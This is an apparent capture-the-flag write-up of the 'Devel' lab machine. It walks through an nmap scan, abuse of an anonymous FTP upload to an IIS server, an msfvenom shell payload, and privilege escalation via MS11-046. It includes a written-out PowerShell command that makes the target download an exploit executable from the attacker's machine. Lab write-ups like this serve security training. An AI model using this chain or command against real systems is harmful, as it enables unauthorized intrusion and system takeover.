# Devel

## Recon

First lets start with a nmap scan. This will give us some info like open ports.

![scan](https://imgur.com/f2hjZGN.png)

From the nmap scan results we see that port 21 and 80 are open.

* port 21 is used for ftp
  * ftp or file transfer protocol. FTP is used to distribute large files across the web server or to upload files to an online server.
* port 80 is used for Hypertext Transfer Protocol (HTTP)
  * This port is a common one in TCP. It sends and receive requested web page.

Since port 80 is open lets enter the ip address in the search bar and see what pops up.

![page](https://imgur.com/3EJvO9M.png)

It appears we have some sort of welcome page? At first glance we see IIS7. And if we click the web page we get taken to a microsoft web page that talks about IIS.

![ms](https://imgur.com/9k3rITd.png)

Next lets take a look at the source code.

![code](https://imgur.com/B7htyOH.png)

Since the site uses IIS we can use this to our advantage.

## FTP

From our nmap scan we see that ftp allows Anonymous logins. We use the ftp command in the terminal.

![ftp](https://imgur.com/0Db0sfx.png)

We successfully connected and using `ls` we can see what files.

Using this connection we can put files in the web server. For example lets put a text file just to test it.

![filetransfer](https://imgur.com/rwQTonr.png)

Now lets call the file from the webpage.

![blah](https://imgur.com/kqDPr0v.png)

Now instead of a txt file lets create a payload using msfvenom.

![msfvenom](https://imgur.com/p9o3Rg1.png)

And just like the txt file we will put the payload in the server with ftp. And once the we call the file we can see command prompt.

![shell](https://imgur.com/O016Icj.png)

However it seems that access is denied....

![denied](https://imgur.com/O0DqEJu.png)

Seems we need to try some privilege escalation lets take a look at the system information.

![info](https://imgur.com/7syCuit.png)

We see that the OS version is 6.1.7600 N/A Build 7600, using all the information lets look for an exploit.

## exploit

After a couple of google searches I found a priv sec exploit.

* [MS11-046](https://www.exploit-db.com/exploits/40564)

> An elevation of privilege vulnerability exists where the AFD improperly validates input passed from user mode to the kernel. An attacker must have valid logon credentials and be able to log on locally to exploit the vulnerability. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode (i.e. with NT AUTHORITY\SYSTEM privileges).

First we download the MS11-046 from github.

![github](https://imgur.com/6h6AGpT.png)

Then using powershell and python we can have the target download this exe from our machine.

We will use python http server to send the files and establish a connection.

```
    powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.27:8000/ms11-046.exe', 'c:\Users\Public\Downloads\ms11-046.exe')"
```

This command will download the exe to the target, placing it in the download folder.

![server](https://imgur.com/69K0VDx.png)

Our file was sent successfully!!

Now lets change to the download folder and run our exe.

![exe](https://imgur.com/7tL9VBI.png)

It works now all thats left to find the flags.

![flags](https://imgur.com/hdcIK29.png)
